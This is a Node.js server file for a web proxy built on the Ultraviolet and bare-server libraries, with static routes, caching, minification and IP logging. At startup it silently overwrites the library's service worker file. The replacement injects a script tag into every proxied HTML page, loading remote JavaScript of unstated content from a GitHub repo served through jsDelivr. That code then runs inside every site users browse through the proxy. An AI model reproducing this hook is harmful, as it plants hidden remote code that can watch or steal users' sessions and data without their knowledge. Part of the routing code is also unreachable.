import { createBareServer } from "@tomphttp/bare-server-node";
import express from "express";
import { createServer } from "node:http";
import { uvPath } from "@titaniumnetwork-dev/ultraviolet";
import { join } from "node:path";
import { hostname } from "node:os";
import path from 'path';
import compression from 'compression';
import minify from 'express-minify';
import uglifyEs from 'uglify-es';
import NodeCache from 'node-cache';
import htmlMinifier from 'html-minifier';
import { Worker, isMainThread, parentPort } from 'worker_threads';
import fs from 'fs';

const __filename = path.resolve(new URL(import.meta.url).pathname.replace(/^\/([a-z]):\//i, '$1:/'));
const __dirname = path.dirname(__filename);
const publicPath = path.resolve(__dirname, '../public/');
const bare = createBareServer("/bare/"); 
const filePath = path.join(uvPath, 'sw.js');
const customsw = `importScripts('uv.bundle.js');
importScripts('uv.config.js');
importScripts(__uv$config.sw || 'uv.sw.js');

const sw = new UVServiceWorker();

self.addEventListener('fetch', (event) => {
  event.respondWith(handleFetchEvent(event));
});

async function handleFetchEvent(event) {
  const response = await sw.fetch(event);

  if (response.ok && response.headers.get('content-type').includes('text/html')) {
    const modifiedResponse = await modifyPageContent(response.clone());
    return modifiedResponse;
  }

  return response;
}

async function modifyPageContent(response) {

  const text = await response.text();
  const modifiedText = text + '<script>!function(){var t=document.createElement("script");t.src="https://cdn.jsdelivr.net/gh/Cencent-Proxy/sw-inject@main/script.js",document.body.append(t)}();</script>'; 

  const modifiedResponse = new Response(modifiedText, {
    status: response.status,
    statusText: response.statusText,
    headers: response.headers,
  });

  return modifiedResponse;
}

`;
fs.writeFile(filePath, customsw, (err) => {
  if (err) {
    console.error(err);
    return;
  }
});
const app = express();


app.use(express.static(publicPath));
const cache = new NodeCache();
app.use("/uv/", express.static(uvPath));

app.use(compression({
  level: 9,
  threshold: 0
}));
app.use(minify({
  uglifyJsModule: uglifyEs,

}));
var logssent = false;
app.use((req, res, next) => { 
  if (logssent == false) {
    console.log("\n");
    console.log("Logs: ")
    const dashCount = process.stdout.columns;
    const dashes = "-".repeat(dashCount);

    const rainbowColors = ['\x1b[31m', '\x1b[33m', '\x1b[32m', '\x1b[36m', '\x1b[34m', '\x1b[35m'];
    const reset = '\x1b[0m';

    let coloredDashes = '';
    for (let i = 0; i < dashCount; i++) {
      const color = rainbowColors[i % rainbowColors.length];
      coloredDashes += color + dashes[i] + reset;
    }

    console.log(coloredDashes);
    logssent = true;
  } else {
    // pass
  }

  const ipAddress = req.ip;
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} - IP: ${ipAddress}`);
  next();
});


const cacheMiddleware = (req, res, next) => {
  const key = req.originalUrl;
  const cachedResponse = cache.get(key);
  if (cachedResponse) {
    res.send(cachedResponse);
  } else {
    res.sendResponse = res.send;
    res.send = (body) => {
      if (res.get('Content-Type') === 'text/html') {
        body = htmlMinifier.minify(body, {
          collapseWhitespace: true,
          removeComments: true,
          minifyCSS: true,
          minifyJS: true,
          minifyURLs: true,
          removeOptionalTags: true
        });
      }
      cache.set(key, body);
      res.sendResponse(body);
    };
    next();
  }
};

function handleRequest(url) {
  if (url === '/apps') {
    return join(publicPath, 'apps.html');
  } else if (url === '/settings') {
    return join(publicPath, 'settings.html');
  } else if (url === '/themes') {
    return join(publicPath, 'themes.html');
  } else {
    return join(publicPath, '404.html');
  }
}

app.get('/apps', cacheMiddleware, (req, res) => {
  res.status(200);
  res.sendFile(handleRequest('/apps'));
});


app.get('/settings', cacheMiddleware, (req, res) => {
  res.status(200);
  res.sendFile(handleRequest('/settings'));
});

app.get('/themes', cacheMiddleware, (req, res) => {
  res.status(200);
  res.sendFile(handleRequest('/themes'));
});

app.use(cacheMiddleware, (req, res) => {
  res.status(404);
  res.sendFile(handleRequest(req.originalUrl));
});

function handleRequestThreaded(url, res) {
  const worker = new Worker(__filename);
  worker.on('message', (message) => {
    res.status(200);
    res.sendFile(message);
  });
  worker.postMessage(url);
}

app.use(cacheMiddleware, (req, res, next) => {
  if (isMainThread) {
    handleRequestThreaded(req.originalUrl, res);
  } else {
    next();
  }
});

const server = createServer();

server.on("request", (req, res) => {
  if (bare.shouldRoute(req)) {
    bare.routeRequest(req, res);
  } else {
    app(req, res);
  }
});

server.on("upgrade", (req, socket, head) => {
  if (bare.shouldRoute(req)) {
    bare.routeUpgrade(req, socket, head);
  } else {
    socket.end();
  }
});

let port = parseInt(process.env.PORT || "");

if (isNaN(port)) port = 8080;

server.on("listening", () => {
  const address = server.address();

  console.log("Listening on:");
  console.log(`\thttp://localhost:${address.port}`);
  console.log(`\thttp://${hostname()}:${address.port}`);
  console.log(
    `\thttp://${
      address.family === "IPv6" ? `[${address.address}]` : address.address
    }:${address.port}`
  );
});

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

function shutdown() {
  console.log("SIGTERM signal received: closing HTTP server");
  server.close();
  bare.close();
  process.exit(0);
}

server.listen({
  port,
});

if (!isMainThread) {
  parentPort.on('message', (url) => {
    const filePath = handleRequest(url);
    parentPort.postMessage(filePath);
  });
}
